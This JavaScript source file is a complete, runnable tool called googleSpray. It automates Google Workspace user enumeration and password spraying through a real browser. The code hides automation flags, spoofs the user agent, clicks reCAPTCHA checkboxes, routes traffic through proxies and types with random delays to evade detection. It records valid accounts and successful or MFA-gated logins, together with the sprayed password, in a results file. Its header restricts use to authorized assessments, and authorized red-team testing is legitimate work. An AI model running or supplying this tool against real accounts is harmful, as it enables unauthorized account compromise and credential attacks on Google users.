/**
 * googleSpray
 *
 * Browser-based Google Workspace authentication assessment tool.
 *
 * This utility automates interaction with Google authentication endpoints
 * using a real Chromium browser in order to:
 *  - Enumerate the existence of Google Workspace / Google Account users
 *  - Perform controlled password spraying attempts against known users
 *
 * The tool operates by reproducing standard browser login flows and
 * evaluating response states such as invalid users, authentication failures,
 * successful logins, MFA challenges, and environmental blocks.
 *
 * Supported features include proxy support, headless execution, retry logic,
 * rate limiting, JSONL result logging, and optional screenshot capture.
 *
 * Intended use is limited to authorized security assessments and controlled
 * testing environments.
 *
 */

const fs = require("fs");
const os = require("os");
const path = require("path");
const url = require("url");
const { Command } = require("commander");
const { connect } = require("puppeteer-real-browser");
const chalk = require("chalk");
const sleep = require("sleep-promise");
require("log-timestamp");

// ---------- CONFIGURATION & CONSTANTS ----------

const MAX_RETRIES = 3;
const STAGE_TIMEOUT = 20000;
const AUTH_URL = "https://accounts.google.com/ServiceLogin?hl=en";

// Enumeration of possible authentication results
const STATES = {
    SUCCESS: "SUCCESS",             // Valid credentials (Spray)
    VALID_USER: "VALID_USER",       // User exists (Enum)
    AUTH_FAILED: "AUTH_FAILED",     // Invalid password
    INVALID_USER: "INVALID_USER",   // Username does not exist
    UNKNOWN_ERROR: "UNKNOWN_ERROR", // Technical error / Timeout / Captcha
    CONNECTION_ERROR: "CONNECTION_ERROR" // Network level failure
};

// ---------- HELPER FUNCTIONS ----------

async function takeScreenshot(page, status, username, opts) {
    if (!opts.screenshots) return;
    try {
        const cleanUser = username.replace(/[^a-zA-Z0-9]/g, "_");
        const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
        const filename = `${status}_${cleanUser}_${timestamp}.png`;
        const filepath = path.join(opts.screenshotDir, filename);
        
        await page.screenshot({ path: filepath, fullPage: true });
        if (opts.verbose) console.log(chalk.gray(`    [o] Screenshot artifact saved: ${filename}`));
    } catch (e) {
        console.error(chalk.red(`    [!] Screenshot capture failed: ${e.message}`));
    }
}

function cleanupProfile(dirPath) {
    if (!dirPath || !fs.existsSync(dirPath)) return;
    
    let retries = 5;
    const retryDelay = 1000;

    const attemptRemoval = () => {
        try {
            fs.rmSync(dirPath, { recursive: true, force: true });
        } catch (err) {
            if (retries > 0) {
                retries--;
                setTimeout(attemptRemoval, retryDelay);
            }
        }
    };
    attemptRemoval();
}

async function handleRecaptcha(page, verbose) {
    try {
        const iframeSelector = 'iframe[title*="reCAPTCHA"]';
        const iframeElement = await page.$(iframeSelector);
        
        if (iframeElement) {
            if (verbose) console.log(chalk.yellow("[!] reCAPTCHA element detected. Initiating interaction..."));
            const frame = await iframeElement.contentFrame();
            const checkbox = await frame.$('.recaptcha-checkbox-border');
            if (checkbox) {
                await sleep(1000); 
                await checkbox.click({ delay: 100 });
                await sleep(3000); 
            }
        }
    } catch (e) {
        // Non-blocking catch
    }
}

// ---------- BROWSER INITIALIZATION ----------

async function initSecureBrowser(proxyString, isHeadless, verbose) {
    const tempProfileDir = fs.mkdtempSync(path.join(os.tmpdir(), "googleSpray-profile-"));
    let proxyUrl = null;
    let proxyAuth = null;

    if (proxyString) {
        try {
            const parsed = new url.URL(proxyString);
            proxyUrl = `${parsed.protocol}//${parsed.hostname}:${parsed.port}`;
            if (parsed.username && parsed.password) {
                proxyAuth = {
                    username: decodeURIComponent(parsed.username),
                    password: decodeURIComponent(parsed.password)
                };
            }
        } catch (e) {
            console.error(chalk.red(`[!] Proxy configuration error: ${e.message}`));
            process.exit(1);
        }
    }
    
    const chromeArgs = [
        '--start-maximized',
        '--window-size=1920,1080', 
        '--disable-infobars', 
        '--disable-features=IsolateOrigins,site-per-process',
        '--lang=en-US', 
        '--accept-lang=en-US,en;q=0.9',
        '--no-sandbox',
        '--disable-setuid-sandbox'
    ];

    if (isHeadless) {
        chromeArgs.push("--headless=new");
    }

    if (proxyUrl) {
        chromeArgs.push(`--proxy-server=${proxyUrl}`);
    }

    const connection = await connect({
        headless: false, 
        args: chromeArgs,
        customConfig: { 
            userDataDir: tempProfileDir 
        },
        connectOption: { 
            defaultViewport: null 
        },
        turnstile: true 
    });

    await connection.page.setViewport({ width: 1920, height: 1080 });

    if (proxyAuth) {
        if (verbose) console.log(chalk.gray("[*] Setting up proxy authentication..."));
        await connection.page.authenticate(proxyAuth);
    }

    await connection.page.setRequestInterception(true);
    
    const blockedURLs = [
        "googlesyndication.com",
        "adservice.google.com",
        "doubleclick.net",
        "pagead2.googlesyndication.com",
        "play.google.com",
    ];

    connection.page.on("request", (req) => {
        const resourceType = req.resourceType();
        const url = req.url();

        if (blockedURLs.some((blockedURL) => url.includes(blockedURL))) {
            req.abort();
            return;
        }

        if (['image', 'stylesheet', 'font', 'media'].includes(resourceType)) {
            req.abort();
            return;
        }

        req.continue();
    });

    await connection.page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
    });
    
    if (isHeadless) {
        await connection.page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
    }

    await connection.page.setExtraHTTPHeaders({
        'Accept-Language': 'en-US,en;q=0.9'
    });

    return { ...connection, tempProfileDir };
}

// ---------- CORE LOGIC (SHARED) ----------

async function executeWorkflow(page, target, opts, mode) {
    const startTime = Date.now();

    // Environmental Check
    const pageText = await page.evaluate(() => document.body.innerText);
    if (pageText.includes("This browser or app may not be secure") || pageText.includes("Couldn't sign you in")) {
        await takeScreenshot(page, "ENV_BLOCK", target.username, opts);
        return { status: STATES.UNKNOWN_ERROR, detail: "Environment/Browser Block", elapsedMs: Date.now() - startTime };
    }

    // Email Entry Stage
    const emailField = 'input[type="email"], input[name="identifier"]';
    try {
        await page.waitForSelector(emailField, { visible: true, timeout: 10000 });
    } catch (e) {
        await takeScreenshot(page, "NO_EMAIL_INPUT", target.username, opts);
        return { status: STATES.UNKNOWN_ERROR, detail: "Email Input Not Found", elapsedMs: Date.now() - startTime };
    }
    
    await page.type(emailField, target.username, { delay: Math.floor(Math.random() * 100) + 50 });
    await sleep(500);
    await page.keyboard.press("Enter");
    await sleep(2000);

    // Captcha Detection
    let isCaptcha = await page.evaluate(() => document.body.innerText.includes("Verify it's you") || !!document.querySelector('iframe[title*="reCAPTCHA"]'));
    if (isCaptcha) {
        await handleRecaptcha(page, opts.verbose);
        await sleep(3000);
    }

    // Email Validation Check (Critical Fork Point)
    // We race to see what happens first: 
    // A) Password field appears (Standard flow)
    // B) Invalid User text appears (User doesn't exist)
    // C) Email input disappears from DOM (User exists, but hit intermediate screen)
    try {
        await Promise.race([
            page.waitForSelector('input[type="password"]', { visible: true, timeout: STAGE_TIMEOUT }),
            page.waitForSelector('input[name="Passwd"]', { visible: true, timeout: STAGE_TIMEOUT }),
            page.waitForFunction(() => {
                const text = document.body.innerText;
                return /Couldn['’]t find your Google Account/i.test(text) || /Enter a valid email/i.test(text);
            }, { timeout: STAGE_TIMEOUT }),
            // New check: The email input is no longer visible/present
            page.waitForFunction(() => {
                const emailInput = document.querySelector('input[type="email"]') || document.querySelector('input[name="identifier"]');
                if (!emailInput) return true; // Removed from DOM
                const style = window.getComputedStyle(emailInput);
                return style.display === 'none' || style.visibility === 'hidden';
            }, { timeout: STAGE_TIMEOUT })
        ]);
    } catch (e) {
        // If we timeout here, it means the Email Input is STILL visible and nothing happened.
        // This is a generic stuck state.
        await takeScreenshot(page, "EMAIL_TIMEOUT", target.username, opts);
        return { status: STATES.UNKNOWN_ERROR, detail: "Stuck at Email Stage", elapsedMs: Date.now() - startTime };
    }

    // A) Check for Invalid User Explicit Message
    const isInvalidUser = await page.evaluate(() => /Couldn['’]t find your Google Account/i.test(document.body.innerText));
    if (isInvalidUser) {
        await takeScreenshot(page, "INVALID_USER", target.username, opts);
        return { status: STATES.INVALID_USER, elapsedMs: Date.now() - startTime };
    }

    // B) Check if Password Field is Ready
    const passFieldExists = await page.evaluate(() => {
        const p1 = document.querySelector('input[type="password"]');
        const p2 = document.querySelector('input[name="Passwd"]');
        return (p1 && p1.offsetParent !== null) || (p2 && p2.offsetParent !== null);
    });

    // C) Check if Email Field is Gone (Heuristic for Valid User + Intermediate Screen)
    const emailFieldGone = await page.evaluate(() => {
        const el = document.querySelector('input[type="email"]') || document.querySelector('input[name="identifier"]');
        if (!el) return true;
        const style = window.getComputedStyle(el);
        return style.display === 'none' || style.visibility === 'hidden';
    });

    // LOGIC DECISION MATRIX
    
    // Case 1: Password field is NOT there, but Email field IS GONE.
    // This implies the user is valid (we moved past email), but we are blocked by 
    // "Select Account", "Account Deleted", "Context Aware Access", etc.
    if (!passFieldExists && emailFieldGone) {
        // We wait a small buffer just in case the password field is animating in slowly
        await sleep(2000);
        const passFieldRetry = await page.$('input[type="password"]');
        
        if (!passFieldRetry) {
            // Confirmed: Valid user, but stuck on intermediate screen
            await takeScreenshot(page, "INTERMEDIATE_SCREEN", target.username, opts);
            return { 
                status: STATES.VALID_USER, 
                detail: "INTERMEDIATE_SCREEN_BLOCK (Cannot Spray)", 
                elapsedMs: Date.now() - startTime 
            };
        }
    }

    // === MODULE: ENUMERATION STOP POINT ===
    // If we are in 'enum' mode and reached this point, the user exists (Password field appeared)
    if (mode === 'enum') {
        await takeScreenshot(page, "VALID_USER", target.username, opts);
        return { status: STATES.VALID_USER, detail: "Account Exists", elapsedMs: Date.now() - startTime };
    }

    // === MODULE: PASSWORD SPRAY CONTINUE ===
    
    // Password Entry Stage
    const passField = (await page.$('input[type="password"]')) || (await page.$('input[name="Passwd"]'));
    
    if (passField) {
        await sleep(1000);
        await page.type('input[type="password"]', target.password, { delay: Math.floor(Math.random() * 100) + 80 });
        await sleep(500);
        await page.keyboard.press("Enter");
        if (opts.verbose) console.log(chalk.gray("    [>] Credentials submitted. Polling for response..."));
    } else {
        await takeScreenshot(page, "NO_PASS_INPUT", target.username, opts);
        return { status: STATES.UNKNOWN_ERROR, detail: "Password Input Missing", elapsedMs: Date.now() - startTime };
    }

    // Final State Analysis (Smart Polling)
    const POLLING_DURATION = 15000; 
    const POLLING_INTERVAL = 1000;
    let elapsedTime = 0;
    let finalStatus = STATES.UNKNOWN_ERROR;
    let finalDetail = "Timeout waiting for transition";

    while (elapsedTime < POLLING_DURATION) {
        await sleep(POLLING_INTERVAL);
        elapsedTime += POLLING_INTERVAL;

        let isPwdVisible = false;
        let currentUrl = "";
        let bodyText = "";

        try {
            isPwdVisible = await page.evaluate(() => {
                 const input = document.querySelector('input[type="password"]') || document.querySelector('input[name="Passwd"]');
                 if (!input) return false;
                 const style = window.getComputedStyle(input);
                 return style.display !== 'none' && style.visibility !== 'hidden' && input.offsetParent !== null;
            });
            currentUrl = page.url();
            bodyText = await page.evaluate(() => document.body.innerText);
        } catch (e) {
            continue;
        }

        if (/myaccount\.google\.com|mail\.google\.com|inbox|accounts\.google\.com\/ManageAccount/i.test(currentUrl)) {
            finalStatus = STATES.SUCCESS;
            finalDetail = "LOGIN_COMPLETED"; 
            break;
        }

        if (!isPwdVisible) {
            finalStatus = STATES.SUCCESS;
            finalDetail = "MFA_TRIGGERED";
            if (/\/challenge\//i.test(currentUrl)) finalDetail = "MFA_CHALLENGE";
            if (/suspicious/i.test(currentUrl)) finalDetail = "SUSPICIOUS_ACTIVITY_BLOCK";
            break;
        }

        if (isPwdVisible) {
            let errorDetail = null;
            if (/Your password was changed/i.test(bodyText)) errorDetail = "PASSWORD_CHANGED";
            if (/Wrong password|password you entered is incorrect/i.test(bodyText)) errorDetail = "WRONG_PASSWORD";

            if (errorDetail) {
                finalStatus = STATES.AUTH_FAILED;
                finalDetail = errorDetail;
                break;
            }
        }
        
        try {
            if (await page.$('iframe[title*="reCAPTCHA"]')) {
                 finalStatus = STATES.UNKNOWN_ERROR;
                 finalDetail = "CAPTCHA_BLOCKED";
                 break;
            }
        } catch (e) { continue; }
    }

    await takeScreenshot(page, finalStatus, target.username, opts);
    return { status: finalStatus, detail: finalDetail, elapsedMs: Date.now() - startTime };
}

// ---------- AUTOMATION ENGINE ----------

async function runAutomation(mode, opts) {
    console.log(chalk.cyan(`
                            __    _____                      
   ____ _____  ____  ____  / /__ / ___/ ____  ________ ___  __
  / __ \`/ __ \\/ __ \\/ __ \\/ / _ \\\\__ \\/ __ \\/ ___/ __ \`/ / / /
 / /_/ / /_/ / /_/ / /_/ / /  __/__/ / /_/ / /  / /_/ / /_/ / 
 \\__, /\\____/\\____/\\__, /_/\\___/____/ .___/_/   \\__,_/\\__, /  
/____/            /____/           /_/               /____/   
    `));
    console.log(chalk.white(`:: googleSpray :: Browser-based Google Workspace Authentication Assessment Tool`));

    // Input Validation
    if (!opts.users && !opts.user) {
        console.error(chalk.red("Error: You must provide a user (-u) or user list (-U)."));
        process.exit(1);
    }
    
    // Create screenshot dir
    if (opts.screenshots && !fs.existsSync(opts.screenshotDir)) {
        fs.mkdirSync(opts.screenshotDir, { recursive: true });
    }

    // Load Targets
    let targets = [];
    try {
        if (opts.user) {
            targets = [{ username: opts.user }];
        } else {
            const data = fs.readFileSync(opts.users, "utf8");
            targets = data.split(/\r?\n/).filter(Boolean).map(line => ({ username: line.trim() }));
        }
    } catch (err) {
        console.error(chalk.red(`Could not read user input: ${err.message}`));
        process.exit(1);
    }

    // Load Password (Spray only)
    if (mode === 'spray' && fs.existsSync(opts.password)) {
        console.error(chalk.red(
            "Error: -p expects a password string, not a file path."
        ));
        process.exit(1);
    }
    
    if (mode === 'spray') {
        targets = targets.map(t => ({
            ...t,
            password: opts.password
        }));
    }

    console.log(chalk.gray(`[*] Targets loaded: ${targets.length}`));
    if (opts.screenshots) console.log(chalk.gray(`[*] Screenshots enabled -> ${opts.screenshotDir}`));

    // Execution Loop
    for (const target of targets) {
        console.log(chalk.blue(`\n[*] Processing: ${target.username}`));
        
        let connection = null;
        let attempt = 0;
        let outcome = null; 

        while (attempt < MAX_RETRIES && !outcome) {
            attempt++;
            
            try {
                if (attempt > 1) console.log(chalk.yellow(`    [!] Attempt ${attempt}/${MAX_RETRIES} - Retrying...`));
                
                connection = await initSecureBrowser(opts.proxy, opts.headless, opts.verbose);
                // 30s timeout for initial load
                await connection.page.goto(AUTH_URL, { waitUntil: "networkidle2", timeout: 30000 });
                
                const result = await executeWorkflow(connection.page, target, opts, mode);

                if (result.status === STATES.UNKNOWN_ERROR) {
                     throw new Error(`Execution yielded UNKNOWN_ERROR: ${result.detail}`);
                }

                outcome = result;

            } catch (e) {
                console.error(chalk.red(`    [X] Attempt ${attempt} failed: ${e.message}`));
                
                if (connection) {
                    try { await connection.browser.close(); } catch(err) {}
                    cleanupProfile(connection.tempProfileDir);
                    connection = null;
                }
                
                if (attempt >= MAX_RETRIES) {
                    outcome = { 
                        status: STATES.CONNECTION_ERROR, 
                        detail: "Max retries exceeded",
                        elapsedMs: 0 
                    };
                }
            }
        }

        if (connection) {
            try { await connection.browser.close(); } catch(e) {}
            cleanupProfile(connection.tempProfileDir);
        }

        // Result Logging
        let logColor = chalk.white;
        if (outcome.status === STATES.SUCCESS || outcome.status === STATES.VALID_USER) logColor = chalk.greenBright;
        if (outcome.status === STATES.AUTH_FAILED) logColor = chalk.yellow;
        if (outcome.status === STATES.INVALID_USER) logColor = chalk.magenta;
        if (outcome.status === STATES.UNKNOWN_ERROR || outcome.status === STATES.CONNECTION_ERROR) logColor = chalk.red;

        console.log(logColor(`[!] RESULT: ${outcome.status}`));
        if (outcome.detail) console.log(chalk.gray(`    Detail: ${outcome.detail}`));
        
        // JSONL Output
        const outputData = { 
            ...outcome, 
            module: mode,
            target: target.username, 
            timestamp: new Date().toISOString() 
        };

        if (mode === 'spray') {
            outputData.password = target.password;
        }

        fs.appendFileSync(opts.output, JSON.stringify(outputData) + "\n");

        console.log(chalk.gray(`[*] Cooldown: ${opts.interval}ms`));
        await sleep(Number(opts.interval));
    }
}

// ---------- CLI CONFIGURATION ----------

const program = new Command();

program
    .name("googleSpray")
    .description("Browser-based Google Workspace Authentication Assessment Tool");

const sharedOptions = (cmd) => {
    return cmd
        .option("-U, --users <file>", "Path to a file containing target usernames")
        .option("-u, --user <email>", "Single target email address")
        .option("--proxy <url>", "Proxy configuration (http://user:pass@host:port)")
        .option("--headless", "Run browser in headless mode")
        .option("-i, --interval <ms>", "Cooldown delay in ms", "5000")
        .option("-o, --output <file>", "JSONL output file", "spray_results.jsonl")
        .option("-v, --verbose", "Enable verbose logging")
        .option("--screenshots", "Capture screenshots") 
        .option("--screenshot-dir <dir>", "Directory for screenshots", "screenshots"); 
};

// Command: SPRAY
const sprayCmd = new Command('spray')
    .description('Perform password spraying against targets')
    .requiredOption("-p, --password <string>", "Password string")
    .action((opts) => runAutomation('spray', opts));

// Command: ENUM
const enumCmd = new Command('enum')
    .description('Enumerate valid users without attempting login')
    .action((opts) => runAutomation('enum', opts));

// Apply shared options to both commands
sharedOptions(sprayCmd);
sharedOptions(enumCmd);

program
    .addCommand(sprayCmd)
    .addCommand(enumCmd);

program.parse(process.argv);
